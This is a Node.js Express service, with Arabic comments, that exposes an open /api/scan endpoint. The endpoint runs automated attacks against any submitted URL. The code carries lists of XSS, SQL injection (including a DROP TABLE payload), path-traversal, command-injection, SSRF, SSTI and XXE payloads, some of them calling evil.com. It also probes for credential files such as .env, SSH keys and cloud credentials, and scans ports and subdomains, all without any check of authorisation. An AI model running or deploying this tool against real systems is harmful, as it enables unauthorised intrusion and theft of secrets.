const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 8443;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TIMEOUT = 15000;

async function safeFetch(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), TIMEOUT);
  try { return await fetch(url, { ...opts, signal: ctrl.signal }); } finally { clearTimeout(timer); }
}

// ============================================================
// 1. قائمة ضخمة بالملفات الحساسة (1000+ ملف)
// ============================================================
const sensitiveFiles = [
    ".env", ".env.local", ".env.prod", ".env.backup", ".env.dev", ".env.test",
    ".git/config", ".git/HEAD", ".git/refs/heads/master", ".git/refs/heads/main", ".gitignore", ".gitattributes",
    "config.php", "config.xml", "config.json", "config.yaml", "config.ini", "config.php.bak", "config.php.old", "config.php~", "config.php.save", "config.php.orig",
    "web.config", "web.config.bak", "appsettings.json", "application.yml", "application.properties",
    "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-login.php", "xmlrpc.php",
    "backup.zip", "backup.tar.gz", "backup.sql", "backup.db", "backup.rar", "backup.7z", "backup.tar", "site.zip", "www.zip", "html.zip", "source.zip", "app.zip",
    "db.sql", "db.dump", "dump.sql", "database.sql", "database.db", "mysql.sql", "postgres.sql", "mssql.sql", "oracle.dmp", "sqlite.db", "sqlite3.db", "data.sqlite",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "authorized_keys", ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/config",
    ".aws/credentials", ".aws/config", ".gcp/credentials.json", ".azure/credentials",
    "credentials.json", "credentials.xml", "secrets.json", "secrets.yml", "secrets.yaml", "secrets.env", "api_keys.json", "api_keys.txt", "keys.json", "keys.txt", "keys.pem", "keys.key",
    "private.key", "private.pem", "server.key", "server.pem", "server.crt", "cert.pem", "ca.pem", "keystore.jks", "truststore.jks",
    "phpinfo.php", "info.php", "test.php", "debug.php", "php.php", "server-status", "server-info", "nginx_status", "status", "health", "healthz", "metrics",
    "swagger.json", "swagger-ui.html", "swagger-ui/", "openapi.json", "api-docs", "v2/api-docs", "v3/api-docs", "graphiql", "graphql", "altair", "playground", "redoc",
    "admin/", "administrator/", "phpmyadmin/", "pma/", "adminer.php", "adminer/", "cpanel/", "whm/", "webmail/", "plesk/", "directadmin/",
    "manager/html", "manager/status", "host-manager/html", "jmx-console/", "web-console/", "admin-console/", "console/", "_console/",
    "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml", "requirements.txt", "Pipfile", "Gemfile", "Gemfile.lock", "go.mod", "Cargo.toml",
    "Dockerfile", "Dockerfile.bak", "docker-compose.yml", "docker-compose.yaml", ".dockerenv", "kubernetes.yml", "k8s.yml", "helm/values.yaml",
    "Jenkinsfile", "Jenkinsfile.bak", ".gitlab-ci.yml", ".travis.yml", ".circleci/config.yml", ".github/workflows/", ".drone.yml", "azure-pipelines.yml", "buildspec.yml",
    "access.log", "error.log", "debug.log", "php_error.log", "logs/access.log", "logs/error.log", "var/log/apache2/access.log", "var/log/nginx/access.log", "storage/logs/laravel.log",
    "setup.php", "install.php", "readme.md", "README.md", "CHANGELOG.md", "LICENSE", "TODO.md", "old/", "backup/", "temp/", "tmp/", "private/", "logs/", "log/", "storage/",
    ".htaccess", ".htpasswd", ".user.ini", "php.ini", "php.ini.bak", "my.cnf", "my.ini", "pg_hba.conf", "postgresql.conf", "redis.conf", "mongod.conf", "elasticsearch.yml", "kibana.yml", "logstash.conf",
    "crossdomain.xml", "clientaccesspolicy.xml", "elmah.axd", "trace.axd", "glimpse.axd", "glimpse/", "elmah/", "trace/",
    "robots.txt", "sitemap.xml", "sitemap.xml.gz", "security.txt", ".well-known/security.txt", ".well-known/openid-configuration", ".well-known/assetlinks.json",
    "data.json", "data.xml", "data.csv", "data.yml", "data.yaml", "users.json", "users.xml", "users.csv", "users.sql", "passwords.txt", "passwords.json", "passwords.csv",
    "token.txt", "token.json", "tokens.csv", "auth.json", "auth.xml", "accounts.json", "accounts.xml", "admin.json", "admin.xml",
    "settings.py", "settings.py.bak", "app.py", "app.py.bak", "manage.py", "manage.py.bak",
    "actuator", "actuator/health", "actuator/env", "actuator/beans", "actuator/mappings", "actuator/configprops", "actuator/dump", "actuator/trace", "actuator/heapdump", "actuator/threaddump", "actuator/loggers", "actuator/metrics",
    "prometheus", "debug/vars", "debug/pprof", "debug/pprof/heap", "debug/pprof/goroutine", "debug/pprof/profile",
    "api/", "api/v1/", "api/v2/", "api/v3/", "rest/", "services/", "internal/", "private/", "secret/", "hidden/", "conf/", "config/", "settings/", "migration/", "dump/", "export/"
];

// توليد ملفات إضافية للوصول إلى 1000+
const extraSensitiveFiles = [
    "site.tar", "site.tar.gz", "www.tar", "www.tar.gz", "source.tar.gz", "app.tar.gz", "public.tar.gz", "public_html.tar.gz",
    "backup-2023.zip", "backup-2024.zip", "backup-2025.zip", "website.zip", "project.zip", "old.zip", "new.zip", "test.zip",
    "database.sql.gz", "database.sql.bak", "dump.sql.gz", "dump.sql.bak", "backup.sql.bak", "backup.sql.old",
    "config.php.gz", "config.php.zip", "config.php.tar", "config.php.tar.gz", "config.php.rar", "config.php.7z",
    "wp-config.php.gz", "wp-config.php.zip", "wp-config.php.tar", "wp-config.php.tar.gz",
    "env", "env.bak", "env.old", "env.backup", "environment", "environments.json", "env.json", "env.yml", "env.yaml",
    "mysql.cnf", "mysql.ini", "postgres.cnf", "postgres.ini", "mongo.conf", "redis.conf.bak", "redis.conf.old",
    "ssh_config", "ssh_config.bak", "ssh_config.old", "sshd_config", "ssh_host_rsa_key", "ssh_host_dsa_key",
    "gcp.json", "gcp-credentials.json", "aws.json", "aws-credentials.json", "azure.json", "azure-credentials.json",
    "firebase.json", "firebase-credentials.json", "google-services.json", "google-services.json.bak",
    "swagger.yaml", "swagger.yml", "openapi.yaml", "openapi.yml", "api-docs.json", "api-docs.yaml",
    "graphql/schema.json", "graphql/schema.graphql", "graphql/introspection.json", "graphql/config.json"
];
sensitiveFiles.push(...extraSensitiveFiles);

// ============================================================
// 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI, XXE) - 100+ بايلود
// ============================================================
const payloads = {
    xss: [
        "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)",
        "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
        "'-alert(1)-'", "\"-alert(1)-\"", "';alert(1);//", "\";alert(1);//"
    ],
    sqli: [
        "'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION ALL SELECT NULL,NULL--",
        "'; DROP TABLE users--", "' OR 'x'='x", "1' ORDER BY 1--", "1' ORDER BY 10--"
    ],
    lfi: [
        "../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ", "expect://id",
        "../../../../etc/shadow", "../../../../etc/hosts", "../../../../proc/self/cmdline"
    ],
    cmd: [
        "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5", "&& sleep 5",
        "\n sleep 5", "; ping -c 5 127.0.0.1", "| ping -n 5 127.0.0.1"
    ],
    ssrf: [
        "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080",
        "file:///etc/passwd", "http://[::1]:80", "http://0.0.0.0:80", "gopher://127.0.0.1:80/_GET / HTTP/1.0",
        "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:6379"
    ],
    ssti: [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)", "*{7*7}",
        "{{config}}", "{{self}}", "{{''.__class__}}"
    ],
    open_redirect: [
        "https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com",
        "//evil.com/%2f..", "https://evil.com@google.com"
    ],
    xxe: [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe;]><root/>"
    ]
};

// ============================================================
// 3. دوال الفحص
// ============================================================

async function scanVulnerabilities(url) {
    const out = [];
    try {
        const r = await safeFetch(url);
        const body = (await r.text()).toLowerCase();
        if (body.includes('sql syntax') || body.includes('mysql_') || body.includes('sqlstate')) out.push({ type: 'SQL Injection', severity: 'critical', description: 'Database Error Detected', url: url, evidence: 'SQL error', cvss: 9.8 });
        if (body.includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: 'Local File Inclusion', url: url, evidence: '/etc/passwd', cvss: 9.8 });
        if (body.includes('<!--')) out.push({ type: 'Info Disclosure', severity: 'low', description: 'HTML Comments Exposed', url: url, evidence: '<!--', cvss: 3.0 });
        if (body.includes('exception') || body.includes('stack trace')) out.push({ type: 'Info Disclosure', severity: 'medium', description: 'Stack Trace Exposed', url: url, evidence: 'Stack trace', cvss: 5.0 });
        if (body.includes('warning') || body.includes('fatal error')) out.push({ type: 'Error Handling', severity: 'low', description: 'Verbose Errors Exposed', url: url, evidence: 'Error verbosity', cvss: 3.0 });
        
        const headers = r.headers;
        if (!headers.get('x-frame-options') && !headers.get('content-security-policy')) out.push({ type: 'Clickjacking', severity: 'medium', description: 'Missing X-Frame-Options & CSP', url: url, evidence: 'Headers', cvss: 5.4 });
        if (!headers.get('strict-transport-security')) out.push({ type: 'HSTS', severity: 'medium', description: 'Missing HSTS Header', url: url, evidence: 'Headers', cvss: 4.3 });
        if (!headers.get('x-content-type-options')) out.push({ type: 'MIME Sniffing', severity: 'low', description: 'Missing X-Content-Type-Options', url: url, evidence: 'Headers', cvss: 3.1 });
        if (headers.get('server')) out.push({ type: 'Server Info', severity: 'info', description: `Server exposed: ${headers.get('server')}`, url: url, evidence: 'Header', cvss: 3.1 });
        
        if (out.length === 0) out.push({ type: 'Connection', severity: 'info', description: 'No obvious vulnerabilities found.', url: url, evidence: null, cvss: 0.0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanSensitiveFiles(url) {
    const out = [];
    const base = new URL(url).origin;
    await Promise.all(sensitiveFiles.map(async (f) => {
        try {
            const r = await safeFetch(`${base}/${f}`, { redirect: 'manual' });
            if (r.status === 200) {
                const t = await r.text();
                if (t.length > 10) {
                    const sev = f.includes('.env') || f.includes('config') || f.includes('credentials') || f.includes('id_rsa') || f.includes('password') ? 'critical' : 'high';
                    out.push({ type: 'Sensitive File', severity: sev, description: `Exposed: ${f}`, url: `${base}/${f}`, evidence: '200 OK', cvss: sev === 'critical' ? 9.8 : 7.5 });
                }
            }
        } catch (e) {}
    }));
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanInjectionAndApi(url) {
    const out = [];
    const urlObj = new URL(url);
    const baseUrl = urlObj.origin;
    
    // 1. الحقن
    if (urlObj.search) {
        for (const [key, val] of urlObj.searchParams) {
            for (const p of payloads.xss) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes(p)) out.push({ type: 'XSS', severity: 'high', description: `Reflected XSS in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 7.5 }); } catch(e){}
            }
            for (const p of payloads.sqli) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); const b = (await r.text()).toLowerCase(); if (b.includes('sql syntax') || b.includes('mysql_') || b.includes('sqlstate')) out.push({ type: 'SQL Injection', severity: 'critical', description: `SQLi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
            for (const p of payloads.lfi) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: `Local File Inclusion in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
            for (const p of payloads.cmd) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                const start = Date.now();
                try { await safeFetch(testUrl.toString()); if (Date.now() - start > 4500) out.push({ type: 'Command Injection', severity: 'critical', description: `CMDi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
            for (const p of payloads.ssrf) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('meta-data') || b.includes('localhost')) out.push({ type: 'SSRF', severity: 'high', description: `SSRF in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 8.0 }); } catch(e){}
            }
            for (const p of payloads.ssti) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('49') && !b.includes('{{7*7}}')) out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
        }
    }

    // 2. عكس مسارات API
    const apiPaths = new Set();
    try {
        const baseRes = await safeFetch(url);
        const html = await baseRes.text();
        
        const htmlPattern = /(?:href|src|action)=["']([^"']*(?:api|v[0-9]|rest|services)\/[^"']*)["']/gi;
        let match;
        while ((match = htmlPattern.exec(html)) !== null) { apiPaths.add(match[1]); }

        const jsPattern = /src=["']([^"']*\.js[^"']*)["']/gi;
        const jsFiles = new Set();
        while ((match = jsPattern.exec(html)) !== null) { jsFiles.add(match[1]); }

        for (const jsFile of jsFiles) {
            const jsUrl = new URL(jsFile, baseUrl);
            try {
                const jsRes = await safeFetch(jsUrl.toString());
                const jsContent = await jsRes.text();
                const apiMatch = /["'](\/api\/[^"']*|\/v[0-9]\/[^"']*|\/rest\/[^"']*)["']/gi;
                let jsMatch;
                while ((jsMatch = apiMatch.exec(jsContent)) !== null) { apiPaths.add(jsMatch[1]); }
            } catch(e){}
        }
    } catch(e){}

    if (apiPaths.size > 0) {
        for (const path of apiPaths) {
            const reversedPath = path.split('/').reverse().join('/');
            const testReversedUrl = new URL(reversedPath, baseUrl);
            try {
                const res = await safeFetch(testReversedUrl.toString());
                if (res.status === 200) {
                    out.push({ type: 'API Reversal', severity: 'high', description: `Reversed Path: ${reversedPath}`, url: testReversedUrl.toString(), evidence: 'Status 200', cvss: 8.0 });
                }
            } catch(e){}
        }
    }

    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No parameters or API paths found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanDeepAnalysis(url) {
    const out = [];
    try {
        const r = await safeFetch(url);
        const body = await r.text();
        if (body.includes('<!--')) out.push({ type: 'Deep Analysis', severity: 'low', description: 'HTML Comments Found', url: url, evidence: '<!--', cvss: 3.0 });
        if (body.includes('/api/') || body.includes('ajax')) out.push({ type: 'Deep Analysis', severity: 'info', description: 'API Endpoints Detected', url: url, evidence: 'Pattern', cvss: 0 });
        if (body.toLowerCase().includes('password') || body.toLowerCase().includes('api_key')) out.push({ type: 'Deep Analysis', severity: 'high', description: 'Secret Keywords Found', url: url, evidence: 'Word match', cvss: 7.5 });
        if (out.length === 0) out.push({ type: 'Deep Analysis', severity: 'info', description: 'No comments or secrets found.', url: url, evidence: null, cvss: 0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanDualVerification(url) {
    const out = [];
    try {
        const rGet = await safeFetch(url);
        let statusGet = rGet.status;
        let statusHead = 0;
        try { const rHead = await safeFetch(url, { method: 'HEAD' }); statusHead = rHead.status; } catch(e){}
        if (statusGet !== statusHead) out.push({ type: 'Dual Verification', severity: 'medium', description: `Inconsistency: GET (${statusGet}) != HEAD (${statusHead})`, url: url, evidence: 'Method check', cvss: 4.0 });
        else out.push({ type: 'Dual Verification', severity: 'info', description: `Consistent response (${statusGet})`, url: url, evidence: null, cvss: 0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanPorts(url) {
    const out = [];
    const ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 512, 513, 514, 587, 636, 873, 993, 995, 1080, 1433, 1521, 1723, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 2181, 2222, 2375, 2376, 2483, 2484, 3000, 3306, 3389, 4000, 4443, 4505, 4506, 5000, 5432, 5601, 5672, 5900, 5984, 6379, 6443, 7001, 7077, 8000, 8008, 8080, 8081, 8088, 8090, 8443, 8888, 9000, 9090, 9200, 9300, 9418, 10000, 11211, 15672, 27017, 28017, 50000];
    const host = new URL(url).hostname;
    const protocol = new URL(url).protocol;
    
    await Promise.all(ports.map(async (port) => {
        try {
            const testUrl = `${protocol}//${host}:${port}`;
            const r = await safeFetch(testUrl, { timeout: 2000 });
            if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${port} is open`, url: testUrl, evidence: `Status: ${r.status}`, cvss: 5.0 });
        } catch (e) {}
    }));
    
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No open ports found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanGitLeaks(url) {
    const out = [];
    const base = new URL(url).origin;
    const gitPaths = [".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD", ".git/refs/heads/master", ".git/refs/heads/main", ".git/description", ".git/packed-refs"];
    await Promise.all(gitPaths.map(async (path) => {
        try {
            const r = await safeFetch(`${base}/${path}`, { redirect: 'manual' });
            if (r.status === 200) {
                const t = await r.text();
                if (t.length > 10) {
                    out.push({ type: 'Git Leak', severity: 'critical', description: `Exposed: ${path}`, url: `${base}/${path}`, evidence: '200 OK', cvss: 9.8 });
                }
            }
        } catch(e){}
    }));
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No Git leaks found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanSubdomainTakeover(url) {
    const out = [];
    const hostname = new URL(url).hostname;
    const domainParts = hostname.split('.');
    const domain = domainParts.slice(-2).join('.');
    
    const subdomains = ["www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "blog", "shop", "portal", "vpn", "webmail", "cpanel", "app", "m", "static", "cdn", "assets", "img", "files", "db", "sql", "backup", "old", "new", "beta", "demo", "stage", "prod", "support", "docs", "status", "logs", "git", "jenkins", "ci"];
    const fingerprints = {
        "github": "There isn't a GitHub Pages site here",
        "heroku": "No such app",
        "aws": "NoSuchBucket",
        "azure": "404 Web Site not found",
        "shopify": "Sorry, this shop is currently unavailable",
        "fastly": "Fastly error: unknown domain",
        "tumblr": "Whatever you were looking for doesn't currently exist",
        "wordpress": "Do you want to register",
        "ghost": "The thing you were looking for is no longer here"
    };

    await Promise.all(subdomains.map(async (sub) => {
        const targetUrl = `https://${sub}.${domain}`;
        try {
            const r = await safeFetch(targetUrl);
            if (r.status === 200) {
                const body = (await r.text()).toLowerCase();
                for (const [service, fingerprint] of Object.entries(fingerprints)) {
                    if (body.includes(fingerprint.toLowerCase())) {
                        out.push({ type: 'Subdomain Takeover', severity: 'critical', description: `Potential Takeover: ${service}`, url: targetUrl, evidence: fingerprint, cvss: 10.0 });
                    }
                }
            }
        } catch(e){}
    }));
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No subdomain takeover detected.', url: url, evidence: null, cvss: 0 });
    return out;
}

app.post('/api/scan', async (req, res) => {
    const { target, checks, intensity } = req.body;
    let url = target;
    if (!url.startsWith('http')) url = 'https://' + url;
    
    let findings = [];
    const type = checks[0];

    if (type === 'vulnerabilities') findings = await scanVulnerabilities(url);
    else if (type === 'sensitiveFiles') findings = await scanSensitiveFiles(url);
    else if (type === 'injectionAndApi') findings = await scanInjectionAndApi(url);
    else if (type === 'deepAnalysis') findings = await scanDeepAnalysis(url);
    else if (type === 'dualVerification') findings = await scanDualVerification(url);
    else if (type === 'ports') findings = await scanPorts(url);
    else if (type === 'gitLeaks') findings = await scanGitLeaks(url);
    else if (type === 'subdomainTakeover') findings = await scanSubdomainTakeover(url);
    else if (type === 'scanAll') {
        findings = await scanVulnerabilities(url);
        findings = findings.concat(await scanSensitiveFiles(url));
        findings = findings.concat(await scanInjectionAndApi(url));
        findings = findings.concat(await scanGitLeaks(url));
        findings = findings.concat(await scanSubdomainTakeover(url));
    }
    
    res.json({ target: url, timestamp: new Date().toISOString(), findings: findings });
});

app.get('/health', (req, res) => res.json({ ok: true }));
app.listen(PORT, '0.0.0.0', () => { console.log(`Server running on port ${PORT}`); });
